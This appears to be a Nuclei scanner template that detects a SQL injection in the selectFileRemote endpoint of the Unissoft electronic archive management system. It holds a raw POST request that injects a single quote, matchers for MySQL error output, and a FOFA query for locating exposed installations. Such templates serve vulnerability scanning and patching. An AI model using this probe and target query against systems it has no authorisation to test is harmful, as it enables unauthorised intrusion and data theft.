id: thams-selectFileRemote-sqli
info:
  name: 紫光电子档案管理系统 selectFileRemote - sqli
  author: leadlife
  severity: high
  description: 紫光电子档案管理系统selectFileRemote存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全
  reference: 
    - https://github.com/ATonysan/poc-exp/blob/7ba7f2a08999ace95cc4ab2076c239e10f385dc6/Unissoft_selectFileRemote_SQLInject.py#L17
    - https://github.com/wy876/POC/blob/main/%E7%B4%AB%E5%85%89%E7%94%B5%E5%AD%90%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%B4%AB%E5%85%89%E7%94%B5%E5%AD%90%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FselectFileRemote%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: app="紫光-档案管理系统" && body="www.unissoft.com"
  tags: 2024,sqli,thams

http:
  - raw:
      - |
        POST /Archive/ErecordManage/selectFileRemote HTTP/1.1
        Host: {{Hostname}}
        Accept: */* Accept-Encoding: gzip, deflate
        Connection: close
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        userID=admin&fondsid=1&comid='
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 404
          - contains_all(body,'SQL syntax','mysql.jdbc')
        condition: and